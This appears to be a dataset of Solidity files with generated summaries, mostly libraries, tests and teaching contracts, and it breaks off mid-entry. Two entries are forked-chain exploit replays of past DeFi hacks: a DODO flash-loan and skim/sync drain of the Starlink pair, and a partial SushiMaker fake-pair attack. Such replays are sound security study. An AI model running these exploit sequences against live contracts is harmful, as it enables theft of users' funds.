        "code": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity >=0.8.0;\n\n/// @notice Read and write to persistent storage at a fraction of the cost.\n/// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/utils/SSTORE2.sol)\n/// @author Modified from 0xSequence (https://github.com/0xSequence/sstore2/blob/master/contracts/SSTORE2.sol)\nlibrary SSTORE2 {\n    uint256 internal constant DATA_OFFSET = 1; // We skip the first byte as it's a STOP opcode to ensure the contract can't be called.\n\n    /*//////////////////////////////////////////////////////////////\n                               WRITE LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function write(bytes memory data) internal returns (address pointer) {\n        // Prefix the bytecode with a STOP opcode to ensure it cannot be called.\n        bytes memory runtimeCode = abi.encodePacked(hex\"00\", data);\n\n        bytes memory creationCode = abi.encodePacked(\n            //---------------------------------------------------------------------------------------------------------------//\n            // Opcode  | Opcode + Arguments  | Description  | Stack View                                                     //\n            //---------------------------------------------------------------------------------------------------------------//\n            // 0x60    |  0x600B             | PUSH1 11     | codeOffset                                                     //\n            // 0x59    |  0x59               | MSIZE        | 0 codeOffset                                                   //\n            // 0x81    |  0x81               | DUP2         | codeOffset 0 codeOffset                                        //\n            // 0x38    |  0x38               | CODESIZE     | codeSize codeOffset 0 codeOffset                               //\n            // 0x03    |  0x03               | SUB          | (codeSize - codeOffset) 0 codeOffset                           //\n            // 0x80    |  0x80               | DUP          | (codeSize - codeOffset) (codeSize - codeOffset) 0 codeOffset   //\n            // 0x92    |  0x92               | SWAP3        | codeOffset (codeSize - codeOffset) 0 (codeSize - codeOffset)   //\n            // 0x59    |  0x59               | MSIZE        | 0 codeOffset (codeSize - codeOffset) 0 (codeSize - codeOffset) //\n            // 0x39    |  0x39               | CODECOPY     | 0 (codeSize - codeOffset)                                      //\n            // 0xf3    |  0xf3               | RETURN       |                                                                //\n            //---------------------------------------------------------------------------------------------------------------//\n            hex\"60_0B_59_81_38_03_80_92_59_39_F3\", // Returns all code in the contract except for the first 11 (0B in hex) bytes.\n            runtimeCode // The bytecode we want the contract to have after deployment. Capped at 1 byte less than the code size limit.\n        );\n\n        /// @solidity memory-safe-assembly\n        assembly {\n            // Deploy a new contract with the generated creation code.\n            // We start 32 bytes into the code to avoid copying the byte length.\n            pointer := create(0, add(creationCode, 32), mload(creationCode))\n        }\n\n        require(pointer != address(0), \"DEPLOYMENT_FAILED\");\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                               READ LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function read(address pointer) internal view returns (bytes memory) {\n        return readBytecode(pointer, DATA_OFFSET, pointer.code.length - DATA_OFFSET);\n    }\n\n    function read(address pointer, uint256 start) internal view returns (bytes memory) {\n        start += DATA_OFFSET;\n\n        return readBytecode(pointer, start, pointer.code.length - start);\n    }\n\n    function read(\n        address pointer,\n        uint256 start,\n        uint256 end\n    ) internal view returns (bytes memory) {\n        start += DATA_OFFSET;\n        end += DATA_OFFSET;\n\n        require(pointer.code.length >= end, \"OUT_OF_BOUNDS\");\n\n        return readBytecode(pointer, start, end - start);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                          INTERNAL HELPER LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function readBytecode(\n        address pointer,\n        uint256 start,\n        uint256 size\n    ) private view returns (bytes memory data) {\n        /// @solidity memory-safe-assembly\n        assembly {\n            // Get a pointer to some free memory.\n            data := mload(0x40)\n\n            // Update the free memory pointer to prevent overriding our data.\n            // We use and(x, not(31)) as a cheaper equivalent to sub(x, mod(x, 32)).\n            // Adding 31 to size and running the result through the logic above ensures\n            // the memory pointer remains word-aligned, following the Solidity convention.\n            mstore(0x40, add(data, and(add(add(size, 32), 31), not(31))))\n\n            // Store the size of the data in the first 32 byte chunk of free memory.\n            mstore(data, size)\n\n            // Copy the code into memory right after the 32 bytes we used to store the size.\n            extcodecopy(pointer, add(data, 32), start, size)\n        }\n    }\n}\n",
        "summary": "This is a Solidity library called SSTORE2 which allows for reading and writing to persistent storage. The `write` function creates a new contract and deploys it with the supplied data as bytecode, and returns the address of the newly created contract. The `read` functions allow for reading from the contract's bytecode at different offsets, and return the bytes at the selected offset(s). The library uses Solidity's inline assembly to manipulate memory and optimize gas usage.",
        "id": "dc070c8d-c49a-495e-8959-60fc31be2c63"
    },
    {
        "code": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity 0.8.15;\n\nimport {DSTestPlus} from \"./utils/DSTestPlus.sol\";\n\nimport {SSTORE2} from \"../utils/SSTORE2.sol\";\n\ncontract SSTORE2Test is DSTestPlus {\n    function testWriteRead() public {\n        bytes memory testBytes = abi.encode(\"this is a test\");\n\n        address pointer = SSTORE2.write(testBytes);\n\n        assertBytesEq(SSTORE2.read(pointer), testBytes);\n    }\n\n    function testWriteReadFullStartBound() public {\n        assertBytesEq(SSTORE2.read(SSTORE2.write(hex\"11223344\"), 0), hex\"11223344\");\n    }\n\n    function testWriteReadCustomStartBound() public {\n        assertBytesEq(SSTORE2.read(SSTORE2.write(hex\"11223344\"), 1), hex\"223344\");\n    }\n\n    function testWriteReadFullBoundedRead() public {\n        bytes memory testBytes = abi.encode(\"this is a test\");\n\n        assertBytesEq(SSTORE2.read(SSTORE2.write(testBytes), 0, testBytes.length), testBytes);\n    }\n\n    function testWriteReadCustomBounds() public {\n        assertBytesEq(SSTORE2.read(SSTORE2.write(hex\"11223344\"), 1, 3), hex\"2233\");\n    }\n\n    function testWriteReadEmptyBound() public {\n        SSTORE2.read(SSTORE2.write(hex\"11223344\"), 3, 3);\n    }\n\n    function testFailReadInvalidPointer() public view {\n        SSTORE2.read(DEAD_ADDRESS);\n    }\n\n    function testFailReadInvalidPointerCustomStartBound() public view {\n        SSTORE2.read(DEAD_ADDRESS, 1);\n    }\n\n    function testFailReadInvalidPointerCustomBounds() public view {\n        SSTORE2.read(DEAD_ADDRESS, 2, 4);\n    }\n\n    function testFailWriteReadOutOfStartBound() public {\n        SSTORE2.read(SSTORE2.write(hex\"11223344\"), 41000);\n    }\n\n    function testFailWriteReadEmptyOutOfBounds() public {\n        SSTORE2.read(SSTORE2.write(hex\"11223344\"), 42000, 42000);\n    }\n\n    function testFailWriteReadOutOfBounds() public {\n        SSTORE2.read(SSTORE2.write(hex\"11223344\"), 41000, 42000);\n    }\n\n    function testWriteRead(bytes calldata testBytes, bytes calldata brutalizeWith)\n        public\n        brutalizeMemory(brutalizeWith)\n    {\n        assertBytesEq(SSTORE2.read(SSTORE2.write(testBytes)), testBytes);\n    }\n\n    function testWriteReadCustomStartBound(\n        bytes calldata testBytes,\n        uint256 startIndex,\n        bytes calldata brutalizeWith\n    ) public brutalizeMemory(brutalizeWith) {\n        if (testBytes.length == 0) return;\n\n        startIndex = bound(startIndex, 0, testBytes.length);\n\n        assertBytesEq(SSTORE2.read(SSTORE2.write(testBytes), startIndex), bytes(testBytes[startIndex:]));\n    }\n\n    function testWriteReadCustomBounds(\n        bytes calldata testBytes,\n        uint256 startIndex,\n        uint256 endIndex,\n        bytes calldata brutalizeWith\n    ) public brutalizeMemory(brutalizeWith) {\n        if (testBytes.length == 0) return;\n\n        endIndex = bound(endIndex, 0, testBytes.length);\n        startIndex = bound(startIndex, 0, testBytes.length);\n\n        if (startIndex > endIndex) return;\n\n        assertBytesEq(\n            SSTORE2.read(SSTORE2.write(testBytes), startIndex, endIndex),\n            bytes(testBytes[startIndex:endIndex])\n        );\n    }\n\n    function testFailReadInvalidPointer(address pointer, bytes calldata brutalizeWith)\n        public\n        view\n        brutalizeMemory(brutalizeWith)\n    {\n        if (pointer.code.length > 0) revert();\n\n        SSTORE2.read(pointer);\n    }\n\n    function testFailReadInvalidPointerCustomStartBound(\n        address pointer,\n        uint256 startIndex,\n        bytes calldata brutalizeWith\n    ) public view brutalizeMemory(brutalizeWith) {\n        if (pointer.code.length > 0) revert();\n\n        SSTORE2.read(pointer, startIndex);\n    }\n\n    function testFailReadInvalidPointerCustomBounds(\n        address pointer,\n        uint256 startIndex,\n        uint256 endIndex,\n        bytes calldata brutalizeWith\n    ) public view brutalizeMemory(brutalizeWith) {\n        if (pointer.code.length > 0) revert();\n\n        SSTORE2.read(pointer, startIndex, endIndex);\n    }\n\n    function testFailWriteReadCustomStartBoundOutOfRange(\n        bytes calldata testBytes,\n        uint256 startIndex,\n        bytes calldata brutalizeWith\n    ) public brutalizeMemory(brutalizeWith) {\n        startIndex = bound(startIndex, testBytes.length + 1, type(uint256).max);\n\n        SSTORE2.read(SSTORE2.write(testBytes), startIndex);\n    }\n\n    function testFailWriteReadCustomBoundsOutOfRange(\n        bytes calldata testBytes,\n        uint256 startIndex,\n        uint256 endIndex,\n        bytes calldata brutalizeWith\n    ) public brutalizeMemory(brutalizeWith) {\n        endIndex = bound(endIndex, testBytes.length + 1, type(uint256).max);\n\n        SSTORE2.read(SSTORE2.write(testBytes), startIndex, endIndex);\n    }\n}\n",
        "summary": "This code defines a Solidity smart contract called SSTORE2Test, which tests the functionality of another smart contract called SSTORE2. SSTORE2 is imported using the line \"import {SSTORE2} from \"../utils/SSTORE2.sol\";\". \n\nThe test contract performs various tests to ensure that SSTORE2's read and write functions work correctly with different combinations of data, start and end boundaries, and pointer addresses. It also includes tests to make sure the functions fail gracefully when given invalid inputs or out-of-bounds indices. \n\nThe code includes various helper functions used for testing, such as \"assertBytesEq\", which checks that two arrays of bytes are equal, and \"bound\", which clamps an input value between a lower and upper bound. The code also imports a testing library called \"DSTestPlus\". \n\nLastly, the code includes a license declaration in the form of \"SPDX-License-Identifier: AGPL-3.0-only\".",
        "id": "7d088817-2058-4820-a6bc-8492409c98ec"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/NumenAlert/status/1626447469361102850\n// https://twitter.com/bbbb/status/1626392605264351235\n// @TX\n// https://bscscan.com/tx/0x146586f05a4513136deab3557ad15df8f77ffbcdbd0dd0724bc66dbeab98a962\n\ncontract ContractTest is Test {\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    IERC20 Starlink = IERC20(0x518281F34dbf5B76e6cdd3908a6972E8EC49e345);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0x425444dA1410940CFdfB6A980Bd16aA7a5376d6D);\n    address dodo1 = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;\n    address dodo2 = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;\n    address dodo3 = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;\n    uint256 dodoFlashAmount1;\n    uint256 dodoFlashAmount2;\n    uint256 dodoFlashAmount3;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 25_729_304);\n    }\n\n    function testExploit() public {\n        dodoFlashAmount1 = WBNB.balanceOf(dodo1);\n        DVM(dodo1).flashLoan(dodoFlashAmount1, 0, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\"Attacker WBNB balance after exploit\", WBNB.balanceOf(address(this)), 18);\n    }\n\n    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        if (msg.sender == dodo1) {\n            dodoFlashAmount2 = WBNB.balanceOf(dodo2);\n            DVM(dodo2).flashLoan(dodoFlashAmount2, 0, address(this), new bytes(1));\n            WBNB.transfer(dodo1, dodoFlashAmount1);\n        } else if (msg.sender == dodo2) {\n            dodoFlashAmount3 = WBNB.balanceOf(dodo3);\n            DVM(dodo3).flashLoan(dodoFlashAmount3, 0, address(this), new bytes(1));\n            WBNB.transfer(dodo2, dodoFlashAmount2);\n        } else if (msg.sender == dodo3) {\n            WBNBToStarlink();\n            while (Starlink.balanceOf(address(Pair)) > 1000) {\n                Starlink.transfer(address(Pair), Starlink.balanceOf(address(Pair)));\n                Pair.skim(address(this));\n                Pair.sync();\n            }\n            StarlinkToWBNB();\n            WBNB.transfer(dodo3, dodoFlashAmount3);\n        }\n    }\n\n    function WBNBToStarlink() internal {\n        uint256 amountIn = WBNB.balanceOf(address(this));\n        WBNB.transfer(address(Pair), WBNB.balanceOf(address(this)));\n        address[] memory path = new address[](2);\n        path[0] = address(WBNB);\n        path[1] = address(Starlink);\n        uint256[] memory values = Router.getAmountsOut(amountIn, path);\n        values[1] = Starlink.balanceOf(address(Pair)) * 51 / 100;\n        Pair.swap(values[1], 0, address(this), \"\");\n    }\n\n    function StarlinkToWBNB() internal {\n        Starlink.approve(address(Router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(Starlink);\n        path[1] = address(WBNB);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            Starlink.balanceOf(address(this)) / 2, 0, path, address(this), block.timestamp\n        );\n    }\n}\n",
        "summary": "This Solidity code defines a smart contract called `ContractTest` that interacts with several other contracts and tokens. The contract has a `setUp` function that sets up a fork and a `testExploit` function that exploits a vulnerability in the DODO DVM flash loan. The contract also defines several internal functions that convert between WBNB and Starlink tokens, and a function `DPPFlashLoanCall` that is called by the DODO DVM protocol to execute the flash loan.",
        "id": "e1210823-e666-4d04-9d63-ec154c444019"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// ERC721A Contracts v4.2.3\n// Creators: Chiru Labs\n\npragma solidity ^0.8.4;\n\n/**\n * This Helper is used to return a dynamic value in the overridden _startTokenId() function.\n * Extending this Helper before the ERC721A contract give us access to the herein set `startTokenId`\n * to be returned by the overridden `_startTokenId()` function of ERC721A in the ERC721AStartTokenId mocks.\n */\ncontract StartTokenIdHelper {\n    // `bytes4(keccak256('startTokenId'))`.\n    uint256 private constant _START_TOKEN_ID_STORAGE_SLOT = 0x28f75032;\n\n    constructor(uint256 startTokenId_) {\n        _initializeStartTokenId(startTokenId_);\n    }\n\n    function startTokenId() public view returns (uint256 result) {\n        assembly {\n            result := sload(_START_TOKEN_ID_STORAGE_SLOT)\n        }\n    }\n\n    function _initializeStartTokenId(uint256 value) private {\n        // We use assembly to directly set the `startTokenId` in storage so that\n        // inheriting this class won't affect the layout of other storage slots.\n        assembly {\n            sstore(_START_TOKEN_ID_STORAGE_SLOT, value)\n        }\n    }\n}\n",
        "summary": "This code defines a contract called `StartTokenIdHelper`, which is meant to be inherited by other contracts that need to override the `_startTokenId()` function of ERC721A contracts. It provides a way to set a dynamic value for `startTokenId`, which is returned by the overridden `_startTokenId()` function. The `StartTokenIdHelper` contract contains a private constant `_START_TOKEN_ID_STORAGE_SLOT`, a public function `startTokenId()`, and a private function `_initializeStartTokenId()`, which sets the `startTokenId` value in storage using assembly. The contract constructor takes a parameter that sets the initial value for `startTokenId`. The code also declares the Solidity version to be used and includes licensing information.",
        "id": "7578be55-c02f-43bc-8f02-cf047594da57"
    },
    {
        "code": "// This code has not been professionally audited, therefore I cannot make any promises about\n// safety or correctness. Use at own risk.\n\npragma solidity ^0.4.20;\n\ncontract StateMachine {\n\n    enum Stages {\n        AcceptingBlindBids,\n        RevealBids,\n        WinnerDetermined,\n        Finished\n    }\n\n    Stages public stage = Stages.AcceptingBlindBids;\n\n    uint public creationTime = now;\n\n    modifier atStage(Stages _stage) {\n        require(stage == _stage);\n        _;\n    }\n\n    modifier transitionAfter() {\n        _;\n        nextStage();\n    }\n\n    modifier timedTransitions() {\n        if (stage == Stages.AcceptingBlindBids && now >= creationTime + 6 days) {\n            nextStage();\n        }\n        if (stage == Stages.RevealBids && now >= creationTime + 10 days) {\n            nextStage();\n        }\n        _;\n    }\n\n    function bid() public payable timedTransitions atStage(Stages.AcceptingBlindBids) {\n        // Implement biding here\n    }\n\n    function reveal() public timedTransitions atStage(Stages.RevealBids) {\n        // Implement reveal of bids here\n    }\n\n    function claimGoods() public timedTransitions atStage(Stages.WinnerDetermined) transitionAfter {\n        // Implement handling of goods here\n    }\n\n    function cleanup() public atStage(Stages.Finished) {\n        // Implement cleanup of auction here\n    }\n\n    function nextStage() internal {\n        stage = Stages(uint(stage) + 1);\n    }\n}\n",
        "summary": "This code implements a state machine on the Ethereum blockchain using Solidity. The state machine represents an auction with four stages: accepting blind bids, revealing bids, determining a winner, and finishing the auction. \n\nThe code uses the `enum` data type to define the different stages of the auction and a `Stages` variable to keep track of the current stage. It also defines several modifiers that validate the current stage of the auction before executing a function and enforces timed transitions between stages. \n\nThe functions `bid()`, `reveal()`, `claimGoods()`, and `cleanup()` implement the logic for each stage of the auction. The internal function `nextStage()` is called after each transition to move the `Stages` variable to the next stage. \n\nNote that the code includes a disclaimer that it has not been professionally audited and should be used at the user's own risk.",
        "id": "72111acb-6467-459f-9b72-94d1d3cac029"
    },
    {
        "code": "pragma solidity ^0.4.0;\n\ncontract StateModifiers {\n    uint private constant varConstantValue = 55;\n    uint private stateValue;\n    \n    function stateAccess() public returns (uint) {\n        stateValue = 10;\n        return stateValue;\n    }\n    \n    function constantAccess() public constant returns (uint) {\n        return block.number;\n    }\n    \n    function viewAccess() public view returns (uint) {\n        return stateValue;\n    }\n    \n    function pureAccess() public pure returns (uint) {\n        return varConstantValue;\n    }\n}",
        "summary": "This is a smart contract written in Solidity. It defines a contract called \"StateModifiers\" that contains four functions:\n\n- The function \"stateAccess\" sets a private variable called \"stateValue\" to 10 and returns its value.\n- The function \"constantAccess\" returns the current block number as a constant value.\n- The function \"viewAccess\" returns the current value of the \"stateValue\" variable without modifying it.\n- The function \"pureAccess\" returns a constant value defined within the contract.",
        "id": "1a0198cf-accd-49b3-8fab-215cdc20ddd4"
    },
    {
        "code": "pragma solidity ^0.4.4;\n\ncontract StorageOverride {\n  uint foo;\n  uint[] bar;\n\n  /*\n  // This will not work!\n  function StorageOverride () {\n    uint[] x;\n    x.push(1);\n    bar = x;\n  }\n  */\n\n  function StorageOverride () {\n    uint[] memory x = new uint[](5);\n    x[0] = 1;\n    bar = x;\n\n    assert(foo == 0);\n    assert(bar[0] == 1);\n  }\n}\n",
        "summary": "This is a Solidity smart contract with two instance variables \"foo\" and \"bar\". It has a constructor function \"StorageOverride\" that creates an array \"x\" of length 5 and assigns the value 1 to its first element. The \"bar\" array is then assigned the value of \"x\", ensuring that \"bar[0]\" also has the value 1. Additionally, the constructor has two assert statements which verify that the variable \"foo\" is 0 and the first element of \"bar\" is 1. The commented out code cannot be used to initialize the contract as it creates and assigns a new, empty array to \"bar\", which does not create the correct value and memory type.",
        "id": "c5d50f0f-1045-40c7-a0cc-c7266a500294"
    },
    {
        "code": "/*\n    This example shows how storage has to be in the same order in the proxy\n    as well as in the delegate contract. This is not the case here, as the\n    delegate declares the uint n and the proxy declares an address before the\n    uint.\n    To test the behavior proceed as follows:\n      1. Deploy the Delegate contract\n      2. Deploy the Proxy contract with the address of Delegate as input parameter\n      3. Deploy the Caller contract with the address of Proxy as input parameter\n      4. Call the go() function of the Caller contract\n      5. Check value of delegate variable in Proxy, which is now the address\n         0x0000000000000000000000000000000000000005\n*/\n\npragma solidity ^0.4.21;\n\ncontract Proxy {\n\n    // The delegate address will be overwritten with the\n    // value that was supposed to be stored in n\n    address public delegate;\n    uint public n = 1;\n\n    function Proxy(address _delegateAdr) public {\n        delegate = _delegateAdr;\n    }\n\n    function() external payable {\n\n        assembly {\n            let _target := sload(0)\n            calldatacopy(0x0, 0x0, calldatasize)\n            let result := delegatecall(gas, _target, 0x0, calldatasize, 0x0, 0)\n            returndatacopy(0x0, 0x0, returndatasize)\n            switch result case 0 {revert(0, 0)} default {return (0, returndatasize)}\n        }\n    }\n}\n\ncontract Delegate {\n\n    // Storage is not in the same order as in the Proxy contract\n    uint public n = 1;\n\n    function adds() public {\n        n = 5;\n    }\n}\n\ncontract Caller {\n\n    Delegate proxy;\n\n    function Caller(address _proxyAdr) public {\n        proxy = Delegate(_proxyAdr);\n    }\n\n    function go() public {\n       proxy.adds();\n    }\n}\n",
        "summary": "This code demonstrates the behavior of storage in Solidity smart contracts. It includes three contracts: Proxy, Delegate, and Caller. The Proxy contract has an address and a uint data storage, but they are listed in the opposite order as the Delegate contract. The address is intended to point to the Delegate contract. The Caller contract calls a function in the Delegate contract via the Proxy contract, which updates the uint data storage. The code is provided with instructions for testing the storage behavior.",
        "id": "50584e66-be83-471e-b9c2-0bc137719253"
    },
    {
        "code": "pragma solidity ^0.4.4;\n\ncontract MyContract {\n  function compare(string s1, string s2) returns (bool) {\n    return (sha3(s1) == sha3(s2));\n  }\n}\n",
        "summary": "This is a simple contract in the Solidity programming language that contains a function called \"compare\". This function takes two string parameters (s1 and s2) as input, calculates the SHA-3 hash value of each input string using the \"sha3\" function, and then checks if the hash values are equal to each other. If they are equal, the function returns true. If they are not equal, it returns false.",
        "id": "dd78277b-a1f3-402e-baf3-79dd24f74cde"
    },
    {
        "code": "// This code has not been professionally audited, therefore I cannot make any promises about\n// safety or correctness. Use at own risk.\n\npragma solidity ^0.4.20;\n\ncontract StringEqualityComparison {\n\n    function hashCompareWithLengthCheck(string a, string b) internal returns (bool) {\n        if (bytes(a).length != bytes(b).length) {\n            return false;\n        } else {\n            return keccak256(a) == keccak256(b);\n        }\n    }\n}\n",
        "summary": "This code is a Solidity contract that contains a function named `hashCompareWithLengthCheck`. This function takes two string arguments and compares their hash values using the SHA-3 cryptographic hash function. The function also checks if the length of both strings is equal and returns a boolean value indicating whether the hashes are the same and the lengths match or not. The purpose of this function is to enable developers to securely compare string values in their Solidity contracts.",
        "id": "5b1099e4-65a3-44b1-987e-4a0d3b9d3ffa"
    },
    {
        "code": "pragma solidity ^0.4.19;\ncontract StringEqualityComparisonGasExample {\n\n    function hashCompareInternal(string a, string b) internal returns (bool) {\n        return keccak256(a) == keccak256(b);\n    }\n\n    function utilCompareInternal(string a, string b) internal returns (bool) {\n        if (bytes(a).length != bytes(b).length) {\n            return false;\n        }\n        for (uint i = 0; i < bytes(a).length; i ++) {\n            if(bytes(a)[i] != bytes(b)[i]) {\n                return false;\n            }\n        }\n        return true;\n    }\n\n    function hashCompareWithLengthCheckInternal(string a, string b) internal returns (bool) {\n        if (bytes(a).length != bytes(b).length) {\n            return false;\n        } else {\n            return keccak256(a) == keccak256(b);\n        }\n    }\n\n    function hashCompare(string a, string b) public returns (bool) {\n        return hashCompareInternal(a, b);\n    }\n\n    function utilCompare(string a, string b) public returns (bool) {\n        return utilCompareInternal(a, b);\n    }\n\n    function hashCompareWithLengthCheck(string a, string b) public returns (bool) {\n        return hashCompareWithLengthCheckInternal(a, b);\n    }\n}\n",
        "summary": "This code is a Solidity contract that offers three functions for comparing two strings:\n- hashCompareInternal(): compares two strings using their keccak256 hash values\n- utilCompareInternal(): iterates over each character of the strings to check if they are identical \n- hashCompareWithLengthCheckInternal(): first checks if the lengths of the strings are equal before comparing their hash values.\nAll three internal functions are called by their respective public functions hashCompare(), utilCompare() and hashCompareWithLengthCheck(). These public functions return a boolean indicating whether the two passed strings are equal.",
        "id": "9ee01721-5b80-4608-b03e-6497f22cc431"
    },
    {
        "code": "pragma solidity ^0.4.4;\n\ncontract MyContract {\n  string str = \"foo\";\n\n  function MyContract() {\n    assert(bytesSize(str) == 3);\n    assert(size(str) == 3);\n  }\n\n  function bytesSize(string s) returns (uint) {\n    return bytes(s).length;\n  }\n\n  function size(string s) returns (uint) {\n    uint length = 0;\n    uint i = 0;\n    bytes memory strBytes = bytes(s);\n\n    while (i < strBytes.length) {\n      if (strBytes[i]>>7 == 0) {\n        i+=1;\n      } else if (strBytes[i]>>5 == 0x6) {\n        i+=2;\n      } else if (strBytes[i]>>4 == 0xE) {\n        i+=3;\n      } else if (strBytes[i]>>3 == 0x1E) {\n        i+=4;\n      } else {\n        i+=1;\n      }\n\n      length++;\n    }\n  }\n}\n",
        "summary": "This code is a smart contract written in Solidity that defines a `MyContract` contract with a `string` variable `str` equal to \"foo\". \n\nThe contract has two functions `bytesSize` and `size` both of which take a string as input. The `bytesSize` function returns the length of `s` in bytes while the `size` function returns the length of `s`. \n\nThe `size` function uses a while loop to iterate over each character in the input string. Inside the while loop, it checks the first few bits of each character to determine how many bytes the character is encoded over and increments `i` accordingly. The function then increments the `length` variable by 1 to count each processed character. \n\nFinally, the constructor function checks whether both `bytesSize(str)` and `size(str)` are equal to 3, using `assert` statements.",
        "id": "79eef8c6-50ab-4b23-9b0c-e7faf16502f2"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev String operations.\n */\nlibrary Strings {\n    bytes16 private constant _HEX_SYMBOLS = \"0123456789abcdef\";\n\n    /**\n     * @dev Converts a `uint256` to its ASCII `string` decimal representation.\n     */\n    function toString(uint256 value) internal pure returns (string memory) {\n        // Inspired by OraclizeAPI's implementation - MIT licence\n        // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol\n\n        if (value == 0) {\n            return \"0\";\n        }\n        uint256 temp = value;\n        uint256 digits;\n        while (temp != 0) {\n            digits++;\n            temp /= 10;\n        }\n        bytes memory buffer = new bytes(digits);\n        while (value != 0) {\n            digits -= 1;\n            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));\n            value /= 10;\n        }\n        return string(buffer);\n    }\n\n    /**\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.\n     */\n    function toHexString(uint256 value) internal pure returns (string memory) {\n        if (value == 0) {\n            return \"0x00\";\n        }\n        uint256 temp = value;\n        uint256 length = 0;\n        while (temp != 0) {\n            length++;\n            temp >>= 8;\n        }\n        return toHexString(value, length);\n    }\n\n    /**\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.\n     */\n    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {\n        bytes memory buffer = new bytes(2 * length + 2);\n        buffer[0] = \"0\";\n        buffer[1] = \"x\";\n        for (uint256 i = 2 * length + 1; i > 1; --i) {\n            buffer[i] = _HEX_SYMBOLS[value & 0xf];\n            value >>= 4;\n        }\n        require(value == 0, \"Strings: hex length insufficient\");\n        return string(buffer);\n    }\n}\n",
        "summary": "This is a Solidity library named \"Strings\" that defines functions for converting uint256 values to their ASCII string representations. The library includes two functions: \"toString\" converts a uint256 to a string representation of its decimal value, and \"toHexString\" converts a uint256 to a string representation of its hexadecimal value. The latter function can also be invoked with a second parameter specifying the desired length of the hexadecimal string.",
        "id": "a801c40e-975e-4ced-adf0-3d3ccb2d91c0"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\n// PoC is incomplete, not sure why but Hardhat and JS gave me a severe headache \u00af\\_(\u30c4)_/\u00af \n/*\nAttack tx: https://etherscan.io/tx/0x0af5a6d2d8b49f68dcfd4599a0e767450e76e08a5aeba9b3d534a604d308e60b\n\nPost Mortems: \nhttps://cmichel.io/replaying-ethereum-hacks-sushiswap-badger-dao-digg/ (author)\nhttps://slowmist.medium.com/slow-mist-sushiswap-was-attacked-for-the-second-time-a47f2d110a84\nhttps://www.rekt.news/badgers-digg-sushi/\n\nWhen new pairs were added in Sushiswaps\u2019 Onsen, some non-ETH pairs were added, but no \"bridge\" was set up in the SushiMaker for DIGG/WBTC.\n\nCode:\nSushiMaker: https://github.com/sushiswap/sushiswap/blob/64b758156da6f9bde1d8619f142946b005c1ba4a/contracts/SushiMaker.sol#L192\nconvert burns LP tokens, gets two tokens back, converts one to the other, converts the other to SUSHI, sends SUSHI to SushiBar (XSushi stakers)\ndeployed: https://etherscan.io/address/0xe11fc0b43ab98eb91e9836129d1ee7c3bc95df50\n\nfee is sent to SushiMaker by SushiSwapPair's burn (from Router::removeLiquidity) in _mintFee\nIUniswapV2Factory(factory).feeTo() == SushiMaker, check here: https://etherscan.io/address/0xc0aee478e3658e2610c5f7a4a2e1777ce9e4f2ac#readContract\n*/\n\ncontract Exploit is Test {\n    IUniswapV2Router02 private constant sushiRouter = IUniswapV2Router02(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);\n    IUniswapV2Factory private constant sushiFactory = IUniswapV2Factory(0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac);\n    IWETH private constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    IERC20 private constant wethBridgeToken = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);  // WBTC\n    IERC20 private constant nonWethBridgeToken = IERC20(0x798D1bE841a82a273720CE31c822C61a67a601C3);  // DIGG\n    ISushiMaker private constant sushiMaker = ISushiMaker(0xE11fc0B43ab98Eb91e9836129d1ee7c3Bc95df50);\n\n    IUniswapV2Pair private wethPair;  // Fake Pair Digg<>WETH\n\n    function testHack() external {\n        vm.createSelectFork(\"https://rpc.builder0x69.io\", 11720049);\n\n        IUniswapV2Pair FakePair = createAndProvideLiquidity();\n        wethPair = IUniswapV2Pair(address(FakePair));\n\n        vm.prank(tx.origin);\n        sushiMaker.convert(address(wethBridgeToken), address(nonWethBridgeToken));\n\n        rugPull();\n\n        console.log(\"Attacker's profit: %s WETH\", WETH.balanceOf(address(this)) / 1e18);\n    }\n\n    function createAndProvideLiquidity() public payable returns (IUniswapV2Pair pair) {\n        // first acquire both tokens for vulnerable pair\n        // we assume one token of the pair has a WETH pair\n        // deposit all ETH for WETH\n        // trade WETH/2 -> wethBridgeToken -> nonWethBridgeToken\n        WETH.deposit{value: 0.001 ether}();\n        WETH.approve(address(sushiRouter), 0.001 ether);\n        address[] memory path = new 